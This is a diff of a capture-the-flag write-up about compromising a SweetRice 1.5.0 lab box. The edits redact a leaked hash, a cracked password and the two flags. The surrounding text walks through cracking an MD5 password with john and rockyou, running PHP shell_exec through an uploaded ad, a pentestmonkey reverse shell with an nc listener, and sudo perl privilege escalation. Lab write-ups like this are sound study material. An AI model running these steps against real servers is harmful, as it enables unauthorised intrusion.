@@ -36,7 +36,7 @@ This gives us several things, such as the `/as` folder and the `/inc` folder. Un
 
 Also, there are license.txt and changelog files and folders, which provide us with some info about the version - we're dealing with 1.5.0, so we can use the latest exploits on Exploit-DB!
 
-Opening the downloaded MySQL backup, we stumble upon the password and the user name. The password is `42f749ade7f9e195bf475f37a44cafcb` and the user name is `manager`.
+Opening the downloaded MySQL backup, we stumble upon the password and the user name.
 
 We can use `john the ripper` to crack the password, which looks like MD5:
 
@@ -44,7 +44,7 @@ We can use `john the ripper` to crack the password, which looks like MD5:
 john pw.txt --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --format=RAW-MD5
 ```
 
-We use the `rockyou` password list and immediately get `Password123` as a password.
+We use the `rockyou` password list and immediately get the resulting password.
 
 With that, we can login to the Admin page! Nice.
 
@@ -76,7 +76,7 @@ echo "<pre>$output</pre>";
 
 This directs us to the Ads page in the SweetRice backend, with a new ad active. If we now access this using `http://<IP>/content/inc/ads/hacked.php` in this case, then we see the executed PHP code, which shows us the contents of `/home`.
 
-This way, we can see that the username is `itguy`. Next we can `ls /home/itguy` to see the files inside of the user's folder. There, we can already get the user flag using `cat /home/itguy/user.txt`. The flag is `THM{63e5bce9271952aad1113b6f1ac28a07}`.
+This way, we can see that the username is `itguy`. Next we can `ls /home/itguy` to see the files inside of the user's folder. There, we can already get the user flag using `cat /home/itguy/user.txt`.
 
 With this exploit, we could also execute a [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), which together with a locally opened netcat session (`nc -lvnp 4444`) enables us to gain access to the server.
 
@@ -92,7 +92,7 @@ $output2 = shell_exec('sudo /usr/bin/perl /home/itguy/backup.pl');
 echo "<pre>$output2</pre>";
 ```
 
-When we execute the exploit again, we get the root flag `THM{6637f41d0177b6f37cb20d775124699f}`.
+When we execute the exploit again, we get the root flag.
 
 All Done!
 
